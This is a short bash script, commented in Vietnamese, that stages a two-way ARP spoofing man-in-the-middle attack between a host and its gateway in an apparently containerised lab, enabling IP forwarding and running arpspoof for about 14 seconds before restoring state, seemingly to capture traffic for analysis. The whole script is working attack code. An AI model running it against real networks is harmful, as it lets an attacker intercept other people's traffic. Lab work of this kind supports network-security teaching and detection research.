#!/usr/bin/env bash
# ARP spoofing hai chiều giữa h10a và gateway (man-in-the-middle). CHỈ chạy trong lab.
HERE="$(cd "$(dirname "$0")/.." && pwd)"; source "$HERE/common.sh"
# 1) ARP hợp lệ trước (để có binding thật của gw trong pcap)
dx h10a ip neigh flush all; dx gw ip neigh flush all
dx h10a ping -c 2 -W 1 10.10.10.1 >/dev/null; dx gw ping -c 2 -W 1 10.10.10.11 >/dev/null
# 2) Đầu độc
dx attacker sysctl -qw net.ipv4.ip_forward=1
dxd attacker timeout 14 arpspoof -i eth1 -t 10.10.10.11 10.10.10.1
dxd attacker timeout 14 arpspoof -i eth1 -t 10.10.10.1 10.10.10.11
sleep 4
dx h10a ping -c 4 10.10.10.1 >/dev/null || true       # traffic đi vòng qua attacker
sleep 8
dx attacker sysctl -qw net.ipv4.ip_forward=0
dx h10a ip neigh flush all; dx gw ip neigh flush all  # khôi phục
